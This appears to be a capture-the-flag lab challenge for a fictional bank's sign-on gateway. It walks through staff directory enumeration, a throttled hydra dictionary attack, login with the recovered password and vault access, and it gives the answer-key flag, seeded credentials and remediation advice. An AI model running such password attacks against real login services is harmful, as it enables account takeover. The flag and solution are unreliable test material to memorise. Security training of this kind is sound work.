# Challenge 5 - Credential Attacks

## Purpose

HarborPoint Financial exposed its single sign-on gateway to the lab network. Intelligence suggests at least one employee uses a weak, season-based password. The learner enumerates the service, identifies a valid account, runs a controlled password attack with the supplied lab wordlist, and uses the recovered credentials to reach the claims escrow vault.

The gateway enforces progressive rate limiting, so the exercise teaches enumeration discipline and throttled tooling rather than raw guessing.

## Scope

| Item | Value |
| --- | --- |
| Company | HarborPoint Financial |
| Target | `https://auth.harborpoint.internal.lab` |
| Lab network | `10.20.0.0/16` |
| Lab wordlist | `/api/harborpoint/lab-wordlist.txt` |
| Rate limit | 6 attempts per 20 seconds per account (HTTP 429 beyond) |
| Primary vulnerability | Weak password on an enumerable account |
| Flag | `RIVAN{credential_attack_hydra}` |

## Learning Objectives

- Enumerate valid accounts from an exposed staff directory.
- Stage a controlled dictionary attack with a supplied wordlist.
- Respect and work within rate limiting (`hydra -W`).
- Use recovered credentials to reach an authenticated resource.
- Explain credential-stuffing and password-spraying defenses.

## Required Evidence

1. The exposed staff directory is enumerated.
2. A valid target account is identified.
3. The controlled password attack is executed.
4. Authentication succeeds with the recovered credentials.
5. The protected claims vault is accessed.
6. The exact flag is submitted.

## Student Workflow

### Step 0 - Start or Reset the Lab

Open `/challenges/credential-attacks` and select **Reset lab**. Reset clears rate-limit counters, sessions, evidence, and flag state.

### Step 1 - Enumerate the Staff Directory

The gateway exposes a public directory:

```http
GET /api/directory HTTP/1.1
Host: auth.harborpoint.internal.lab
```

The response lists staff names, roles, and emails, and notes that usernames follow the directory naming convention (first initial plus last name): `mrivera`, `helpdesk`, `admin`, `kduarte`.

### Step 2 - Identify the Target Account

A login attempt against a valid username behaves identically to an invalid-password attempt, so account validity is established from the directory, not from error oracle behavior. The claims analyst `mrivera` is the intended target.

### Step 3 - Run the Controlled Password Attack

Fetch the wordlist and attack with throttling:

```bash
curl https://auth.harborpoint.internal.lab/lab-wordlist.txt
hydra -l mrivera -P lab-wordlist.txt -W 2 auth.harborpoint.internal.lab http-post-form "/api/login:username=^USER^&password=^PASS^:Invalid"
```

Without `-W 2` the gateway answers HTTP 429 after six attempts inside a 20-second window. The attack recovers `Summer2024!` for `mrivera`. The other seeded accounts (`helpdesk` / `Hd$k-9vX2!qL7#zR4`, `admin` / `Hp-Adm1n!8wQ5#eT2`) are strong and are not cracked by the wordlist.

### Step 4 - Authenticate and Reach the Vault

Sign in through the target page or the API:

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"mrivera","password":"Summer2024!"}
```

With the authenticated session, open the claims escrow vault:

```http
GET /api/secure-vault HTTP/1.1
```

The vault returns the flag `RIVAN{credential_attack_hydra}`. Submit the exact value.

## Expected Evidence States

| Evidence | Trigger |
| --- | --- |
| Directory enumerated | `/api/directory` is requested |
| Valid account identified | A login attempt names a real account |
| Password attack executed | Three or more failed attempts against a valid account |
| Authentication succeeded | Login returns a session |
| Vault accessed | `/api/secure-vault` returns 200 to the authenticated session |
| Flag submitted | Server validates the exact flag |

## Reset Requirements

Reset must clear the rate-limit window counters, invalidate all sessions, and restore evidence and flag state. Account passwords return to their seeded values.

## Instructor Notes

The lesson is the attack chain, not the single weak password: directory enumeration enables account validity, the wordlist makes the attack bounded, and the 429 responses force realistic throttling. The vault intentionally requires an authenticated session so that recovering the password alone does not complete the challenge.

## Remediation

**Vulnerability:** Weak, season-based password on an enumerable account.

**Attack surface:** Public staff directory and the sign-on gateway login endpoint.

**Impact:** Account takeover and access to the restricted claims escrow vault.

**Root cause:** Directory disclosure, no multi-factor authentication, and a password policy that permits predictable seasonal passwords.

**Remediation:** Enforce MFA, screen passwords against breached and predictable-pattern lists, remove or restrict the public directory, apply progressive lockout and IP throttling with alerting, and monitor for spraying patterns across accounts.
